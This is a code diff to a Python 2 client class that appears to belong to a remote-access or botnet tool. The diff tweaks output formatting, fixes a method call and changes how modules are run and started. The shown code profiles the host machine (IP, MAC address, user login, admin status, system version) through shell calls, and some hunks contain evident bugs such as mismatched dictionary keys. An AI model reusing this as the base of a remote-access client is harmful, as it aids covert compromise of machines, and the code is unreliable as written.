@@ -253,21 +253,21 @@ class Client(object):
 
     def _show(self, dict_or_json):
         try:
-            results = json.dumps(dict_or_json, indent=2, separators=(',','\t'))
+            results = json.dumps(dict_or_json, indent=2, separators=(',',': '), sort_keys=True)
         except Exception as e:
             try:
                 string_repr = repr(dict_or_json)
                 string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
                 string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
                 string_repr = string_repr.replace('(', '[').replace(')', ']')
-                results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', '\t'))
+                results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', ': '), sort_keys=True)
             except:
                 results = repr(dict_or_json)
         return results
 
 
     def _info(self, **args):
-        return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
+        return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).replace('\n','') if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
 
     def _result(self):
         return {module:{} for module in self.mods}
@@ -282,7 +282,7 @@ class Client(object):
             except: pass
 
     def _admin(self):
-        info = self.info()
+        info = self._info()
         if info['Admin']:
             return {'User': info['login'], 'Administrator': info['admin']}
         if self.f:
@@ -821,8 +821,10 @@ class Client(object):
 
     @command
     def run_modules(self):
-        mods = [self.threads.update({ mod : Thread(target=getattr(self, mod), name=mod)}) for mod in self.mods if self.mods[mod].status if sys.platform in self.mods[mod].platforms if mod not in self.threads]
+        mods = [Thread(target=getattr(self, mod), name=mod) for mod in self.mods if self.mods[mod].status if sys.platform in self.mods[mod].platforms if mod not in self.threads]
         for module in mods:
+            if self.v:
+                print 'Running {}...'.format(str(module))
             self.threads[module].start()
         if not self.mode:
             return "Tasks complete."
@@ -941,7 +943,7 @@ class Client(object):
 
 def main(*args, **kwargs):
     client = Client(**kwargs)
-    return client.start()
+    return client
 
 
 if __name__ == '__main__':
